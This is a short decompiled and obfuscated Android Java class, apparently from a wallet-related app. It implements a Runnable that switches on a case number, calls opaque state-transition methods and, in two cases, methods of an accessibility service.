package o;

import com.guard.wallet.service.MyAccessibilityService;
import java.util.Collections;
import java.util.LinkedList;
import java.util.concurrent.atomic.AtomicReference;

// $VF: synthetic class
public final class s implements Runnable {
   public final int a;
   public final t b;

   @Override
   public final void run() {
      r.f var4 = r.f.m;
      int var1 = this.a;
      t var3 = this.b;
      switch (var1) {
         case 0:
            var3.Q();
            return;
         case 1:
            var3.U();
            return;
         case 2:
            if (var3.I()) {
               var3.o.set(r.f.g);
            }

            return;
         case 3:
            var3.R();
            return;
         case 4:
            if (!var3.I() && !var3.q(Collections.singletonList(t.M()))) {
               boolean var2 = com.guard.wallet.utils.g.K();
               var4 = r.f.i;
               AtomicReference var5 = var3.o;
               if (!var2 && !var3.J()) {
                  if (t.a0()) {
                     var5.set(r.f.k);
                     com.guard.wallet.helper.g.h(8);
                  }

                  if (var3.q(Collections.singletonList(t.M()))) {
                     var3.R();
                  } else if (var3.H()) {
                     var3.Q();
                  } else {
                     LinkedList var7 = new LinkedList();
                     var7.add(t.d0());
                     var7.add(t.g0());
                     if (var3.q(var7)) {
                        var3.U();
                     }
                  }
               } else {
                  var5.set(var4);
                  com.guard.wallet.helper.g.h(8);
                  var3.T();
               }
            }

            return;
         case 5:
            var3.T();
            return;
         case 6:
            if (var3.J()) {
               var3.c0();
               var3.o.set(var4);
               if (MyAccessibilityService.P() != null) {
                  MyAccessibilityService.P().u();
                  MyAccessibilityService.P().z();
                  com.guard.wallet.helper.g.h(10);
               }
            }

            return;
         case 7:
            if (var3.J()) {
               var3.c0();
               var3.o.set(var4);
               if (MyAccessibilityService.P() != null) {
                  MyAccessibilityService.P().z();
                  com.guard.wallet.helper.g.h(10);
               }
            }

            return;
         default:
            var3.S();
      }
   }
}
